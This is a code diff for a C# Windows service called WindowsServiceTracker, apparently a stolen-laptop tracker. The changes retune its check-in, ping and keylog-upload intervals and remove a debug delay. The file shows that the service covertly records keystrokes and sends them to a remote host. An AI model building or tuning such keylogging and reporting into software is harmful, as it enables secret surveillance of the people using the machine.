@@ -38,7 +38,7 @@ namespace WindowsServiceTracker
         private const string ERROR_LOG_NAME = "TrackerErrorLog";
         private const string ERROR_LOG_MACHINE = "TrackerComputer";
         private const string ERROR_LOG_SOURCE = "WindowsServiceTracker";
-        public const int CHECKIN_WAIT_TIME = 60000; //todo increase to ~5min after debugging
+        public const int CHECKIN_WAIT_TIME = 900000; //tie between checkins
         private const string REG_PATH = "Software\\SOT\\WindowsServiceTracker";
         private const string REG_FIELD_STOLEN = "Stolen";
         private const string REG_FIELD_MAC = "MAC";
@@ -70,7 +70,7 @@ namespace WindowsServiceTracker
         private TcpClient tcp;
         private static bool reportedStolen = false;
         private int pingFrequency = 30000;
-        private int keylogFrequency = 20000; //todo up time on final release
+        private int keylogFrequency = 300000; //time between keylog pushes
         private Stopwatch pingStopwatch = new Stopwatch();
         private Stopwatch keylogStopwatch = new Stopwatch();
         private int currentIP = 0;
@@ -99,7 +99,7 @@ namespace WindowsServiceTracker
             //System.Diagnostics.Debugger.Launch();
 
             //Keep the service running for 15 seconds
-            Thread.Sleep(30000); //todo remove for final release
+            //Thread.Sleep(30000); //todo remove for final release
 
             //Sets the current directory to where the WindowsServiceTracker.exe is located rather
             //than some Windows folder that I couldn't seem to locate
@@ -287,7 +287,7 @@ namespace WindowsServiceTracker
             tcpKeepAlive = true;
             pingStopwatch.Restart();
             keylogStopwatch.Restart();
-            int maxwaitBetweenConnects = 60;
+            int maxwaitBetweenConnects = 30;
             int waitToConnect = 0;
             int bufferSize = 1;
             byte[] buffer = new byte[bufferSize];
